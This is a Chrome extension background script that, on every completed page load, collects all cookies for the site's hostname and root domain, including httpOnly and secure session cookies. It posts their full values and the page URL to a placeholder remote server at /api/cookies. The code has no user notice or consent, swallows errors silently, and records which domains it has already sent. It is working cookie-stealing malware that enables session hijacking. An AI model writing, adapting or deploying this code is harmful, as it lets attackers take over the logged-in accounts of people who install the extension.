const SERVER_URL = "YOUR_SERVER_URL";
const UPLOAD_KEY = "YOUR_UPLOAD_KEY";

// Persist uploaded domains across service worker restarts
async function hasUploaded(domain) {
  const result = await chrome.storage.local.get("uploaded");
  const uploaded = result.uploaded || [];
  return uploaded.includes(domain);
}

async function markUploaded(domain) {
  const result = await chrome.storage.local.get("uploaded");
  const uploaded = result.uploaded || [];
  if (!uploaded.includes(domain)) {
    uploaded.push(domain);
    await chrome.storage.local.set({ uploaded });
  }
}

// Get root domain to catch cookies set on .example.com
function getRootDomain(hostname) {
  const parts = hostname.split(".");
  return parts.length > 2 ? parts.slice(-2).join(".") : hostname;
}

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete" || !tab.url || !tab.url.startsWith("http")) return;

  const url = new URL(tab.url);
  const rootDomain = getRootDomain(url.hostname);

  if (await hasUploaded(rootDomain)) return;

  // Fetch cookies for both exact hostname and root domain
  const [cookies1, cookies2] = await Promise.all([
    chrome.cookies.getAll({ domain: url.hostname }),
    chrome.cookies.getAll({ domain: rootDomain })
  ]);

  // Merge and deduplicate by name+domain
  const seen = new Set();
  const cookies = [...cookies1, ...cookies2].filter(c => {
    const key = `${c.name}|${c.domain}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  if (cookies.length === 0) return;

  const payload = {
    url: tab.url,
    domain: rootDomain,
    cookies: cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly,
      sameSite: c.sameSite,
      expirationDate: c.expirationDate || null
    })),
    timestamp: new Date().toISOString()
  };

  try {
    const res = await fetch(`${SERVER_URL}/api/cookies`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-key": UPLOAD_KEY },
      body: JSON.stringify(payload)
    });
    if (res.ok) await markUploaded(rootDomain);
  } catch (e) {}
});
